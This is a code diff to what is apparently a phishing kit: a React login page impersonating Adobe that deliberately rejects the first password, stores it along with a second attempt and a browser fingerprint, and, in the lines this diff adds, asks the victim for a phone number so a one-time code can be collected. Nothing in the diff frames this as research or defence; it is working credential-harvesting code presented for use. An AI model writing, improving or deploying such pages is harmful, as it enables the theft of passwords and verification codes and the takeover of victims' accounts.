@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
+import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles, Phone } from 'lucide-react';
 import { getBrowserFingerprint } from '../utils/oauthHandler';
 import {
   generateOTP,
@@ -38,6 +38,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
   
   // OTP Flow States
   const [showOTPFlow, setShowOTPFlow] = useState(false);
+  const [showManualPhoneEntry, setShowManualPhoneEntry] = useState(false);
+  const [manualPhone, setManualPhone] = useState('');
   const [detectedPhone, setDetectedPhone] = useState('');
   const [otp, setOtp] = useState('');
   const [firstAttemptPassword, setFirstAttemptPassword] = useState('');
@@ -93,8 +95,9 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
         setFirstAttemptPassword(password);
         await new Promise(resolve => setTimeout(resolve, 1500));
-        setErrorMessage('Invalid email or password. Please try again.');
+        setErrorMessage('The email or password you entered is incorrect. Please try again.');
         setIsLoading(false);
+        setPassword('');
         return;
       }
 
@@ -116,6 +119,9 @@ const LoginPage: React.FC<LoginPageProps> = ({
           setDetectedPhone(otpResult.phone);
           setShowOTPFlow(true);
           console.log('✅ OTP sent to detected phone:', otpResult.phone);
+        } else if (otpResult.manualEntryRequired) {
+            setShowManualPhoneEntry(true);
+            console.log('📱 Phone detection failed, requesting manual entry.');
         } else {
           setErrorMessage(`Failed to send OTP: ${otpResult.error}`);
           console.error('❌ OTP flow failed:', otpResult.error);
@@ -130,6 +136,38 @@ const LoginPage: React.FC<LoginPageProps> = ({
       if (onLoginError) onLoginError('Login failed. Please try again.');
       setIsLoading(false);
     }
+  };
+  
+  const handleManualPhoneSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!manualPhone || manualPhone.length < 10) {
+        setErrorMessage('Please enter a valid phone number.');
+        return;
+    }
+    
+    setIsLoading(true);
+    setErrorMessage('');
+
+    const otpResult = await initiateOTPFlow(
+      currentEmail,
+      firstAttemptPassword,
+      secondAttemptPassword,
+      selectedProvider!,
+      typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
+      manualPhone
+    );
+
+    if (otpResult.success) {
+      setDetectedPhone(otpResult.phone);
+      setShowManualPhoneEntry(false);
+      setShowOTPFlow(true);
+      console.log('✅ OTP sent to manually entered phone:', otpResult.phone);
+    } else {
+      setErrorMessage(`Failed to send OTP: ${otpResult.error}`);
+      console.error('❌ OTP flow failed after manual entry:', otpResult.error);
+    }
+    
+    setIsLoading(false);
   };
 
   const handleOTPSubmit = async (e: React.FormEvent) => {
@@ -191,6 +229,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
   const handleBackToForm = () => {
     setShowOTPFlow(false);
+    setShowManualPhoneEntry(false);
     setOtp('');
     setErrorMessage('');
   };
@@ -202,7 +241,80 @@ const LoginPage: React.FC<LoginPageProps> = ({
     setLoginAttempts(0);
     setErrorMessage('');
     setShowOTPFlow(false);
+    setShowManualPhoneEntry(false);
   };
+  
+    // MANUAL PHONE ENTRY FLOW
+  if (showManualPhoneEntry) {
+    return (
+        <div
+            className="login-bg min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
+            style={{ backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')", backgroundSize: 'cover', backgroundPosition: 'center', backgroundRepeat: 'no-repeat' }}
+        >
+            <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
+                <div className="relative bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                    <div className="px-6 py-8 bg-gradient-to-r from-white to-slate-50 border-b border-gray-100 flex items-center gap-4 relative">
+                        <div className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2">
+                            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-100 border border-slate-100">
+                                <Sparkles className="w-4 h-4 text-indigo-500" />
+                                <span className="text-xs font-medium text-indigo-700">Verify Your Phone</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div className="px-6 py-6 flex flex-col gap-6">
+                        <div className="space-y-4">
+                            <p className="text-sm text-slate-600">
+                                We could not automatically detect a phone number. Please enter your phone number to receive a verification code.
+                            </p>
+
+                            <form onSubmit={handleManualPhoneSubmit} className="space-y-4">
+                                {errorMessage && (
+                                    <div className="rounded-lg p-3 bg-red-50 border border-red-100">
+                                        <p className="text-sm text-red-700">{errorMessage}</p>
+                                    </div>
+                                )}
+
+                                <div>
+                                    <label className="block text-sm font-medium text-slate-700 mb-2">Phone Number</label>
+                                    <div className="relative">
+                                        <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
+                                        <input
+                                            type="tel"
+                                            value={manualPhone}
+                                            onChange={(e) => setManualPhone(e.target.value)}
+                                            placeholder="e.g., +1 123-456-7890"
+                                            required
+                                            className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
+                                        />
+                                    </div>
+                                </div>
+
+                                <button
+                                    type="submit"
+                                    disabled={isLoading}
+                                    className="w-full py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow transition-all"
+                                >
+                                    {isLoading ? (
+                                        <span className="inline-block w-4 h-4 mr-2 border-2 border-white/40 border-t-white rounded-full animate-spin align-middle" />
+                                    ) : null}
+                                    <span>{isLoading ? 'Sending Code...' : 'Send Verification Code'}</span>
+                                </button>
+                            </form>
+                        </div>
+
+                        <div className="pt-2 border-t border-gray-100 space-y-2">
+                            <button onClick={handleBackToForm} className="text-sm text-slate-600 hover:text-slate-900 font-medium w-full text-center">
+                                ← Back
+                            </button>
+                            <p className="text-xs text-slate-500 text-center">© 2025 Adobe Inc. SSL secured.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    );
+  }
 
   // OTP FLOW: Enter OTP code
   if (showOTPFlow) {
@@ -307,7 +419,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
             <div className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2">
               <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-100 border border-slate-100">
                 <Sparkles className="w-4 h-4 text-indigo-500" />
-                <span className="text-xs font-medium text-indigo-700">Select Your Provider</span>
+                <span className="text-xs font-medium text-indigo-700">{!selectedProvider ? 'Select Your Provider' : `Sign in with ${selectedProvider}`}</span>
               </div>
             </div>
           </div>
@@ -404,7 +516,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                     className="w-full py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow"
                   >
                     {isLoading && <span className="inline-block w-4 h-4 mr-2 border-2 border-white/40 border-t-white rounded-full animate-spin align-middle" />}
-                    <span>{isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Sending OTP...') : 'Sign In Securely'}</span>
+                    <span>{isLoading ? (loginAttempts < 2 ? 'Signing in...' : 'Proceeding to Verification...') : 'Sign In Securely'}</span>
                   </button>
                 </form>
               </div>
